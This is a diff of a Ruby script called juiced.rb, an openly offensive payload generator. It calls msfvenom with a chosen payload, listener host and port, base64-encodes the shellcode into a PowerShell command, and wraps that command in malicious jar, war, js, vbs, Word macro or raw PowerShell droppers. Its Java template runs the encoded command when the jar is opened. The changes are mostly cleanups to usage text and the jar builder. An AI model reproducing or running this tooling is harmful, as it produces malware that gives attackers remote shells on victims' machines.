@@ -1,12 +1,12 @@
 #!/usr/bin/env ruby
 #Author: Andrew Bonstrom
-#v1.2
+#v1.3
 #Credits to: Matthew Graber - Beastly PS Attack technique, TrustedSec group - Idea with Unicorn.py
 require 'io/console'
 require 'base64'
 def usage
-	puts "Usage: ruby juiced.rb MsfvenomPayload Lhost Lport payloadFlag PayloadName\n"
-	puts "Note: Payload name required for payloads that output a file." 
+	puts "Usage: ruby juiced.rb <msfvenomPayload> <lhost> <lport> <payloadFlag> <payloadName>\n\n"
+	puts "Note: A file name is required for payload formats that output a file." 
 	puts "Payload Options: jar, war, macro, ps, vbs, and js."
 end
 #######################################################################################################################
@@ -14,16 +14,33 @@ end
 #######################################################################################################################
 #This first is for creating a jar file that executes the base64 encoded powershell syntax
 def gen_jarFile (base64Command, fileName)
-	#Building the .java one liner
-	javaFile1 = 'import java.io.*;public class' + ' ' +fileName + '{public static void main(String args[]){try{Process p = Runtime.getRuntime().exec("' 
-        javaFile2 = javaFile1 + base64Command + '");}catch(IOException e1){}}}'
-	#Write the one liner to a file.Name.java
-	File.open(fileName+".java", "w") do |f|     
-		f.write(javaFile2)   
+        #Strips out the \n char that unicorn adds at the end
+        #Building the .java one liner
+#       javaFile1 = 'import java.io.*;public class ' + fileName + '{public static void main(String args[]){try{Process p = Runtime.getRuntime().exec("'
+#        javaFile2 = javaFile1 + shellcode + '");}catch(IOException e1){}}}'
+	javaStr = <<-EOS
+import java.io.*;
+
+    public class fileName
+    {
+        public static void main(String args[])
+        {
+            try
+            {
+                Process p=Runtime.getRuntime().exec("base64Command");
+            }
+            catch(IOException e1) {}
+        }
+    }
+EOS
+	javaStr = javaStr.to_s.sub("fileName", fileName)
+	javaStr = javaStr.sub("base64Command", base64Command)
+        File.open(fileName+".java", "w") do |f|
+                f.write(javaStr)	
 	end
-	#Creates manifest file
+	#Creates manifest file, grabs the user provided file name and tacks on a newline char
 	File.open("manifest.txt", "w") do |f|
-		f.write('Main-Class: ' + 'fileName')
+		f.write('Main-Class: ' + fileName + "\n")
 	end
 	#Builds and executes command to compile .java into .class
 	#Then it creates the jar file and cleans up
@@ -132,7 +149,8 @@ def generate_shellcode (payload, lhost, lport)
 	formattedShellcode = ''
 	#Build the msfvenom command from user input
 	command = ("msfvenom -p " + payload + " LHOST=" + lhost +" LPORT=" + lport + " -a x86 --platform windows -f c")
-	puts "Now running" +  command
+	puts "Now running " +  command
+	puts " "
 	#Runs commands within sub process, sleeps for 5 seconds while msfvenom builds the shellcode and then assigns it to a variable
 	IO.popen(command) do |f|
 		sleep(5)
@@ -156,29 +174,29 @@ end
 if ARGV.empty?
 	usage
 else
-	temp = generate_shellcode(ARGV[0],ARGV[1], ARGV[2])
+	genShellcode = generate_shellcode(ARGV[0],ARGV[1], ARGV[2])
 	#Call function to base64 encode everything and issue out powershell command
-	command = gen_command(temp)
+	command = gen_command(genShellcode)
 	#Case switch statement for different payload flags
 	case ARGV[3]
 	when "jar"
-		puts "Now creating file with .jar extension, please check local directory."
+		puts "Now creating file with .jar extension, please check local directory.\n\n"
 		gen_jarFile(command, ARGV[4])
 	when "ps"
 		puts gen_psCommand(command)
 	when "macro"
-		puts "Now creating Copy/Pastable Word Macro...."
+		puts "Now creating Copy/Pastable Word Macro....\n\n"
 		gen_Macro(command)
 	when "js"
-		puts "Now creating file with .js extension, please check local directory."
+		puts "Now creating file with .js extension, please check local directory.\n\n"
 		gen_jsFile(command, ARGV[4])
 	when "vbs"
-		puts "Now creating file with .vbs extension, please check local directory."
+		puts "Now creating file with .vbs extension, please check local directory.\n\n"
 		gen_vbsFile(command, ARGV[4])
 	when "war"
-		puts "Now creating file with .war extension, please check local directory."
+		puts "Now creating file with .war extension, please check local directory.\n\n"
 		gen_warFile(command, ARGV[4])
 	else
-	puts "You forgot to specify a payload."
+		puts "You forgot to specify a payload extension."
 	end
 end
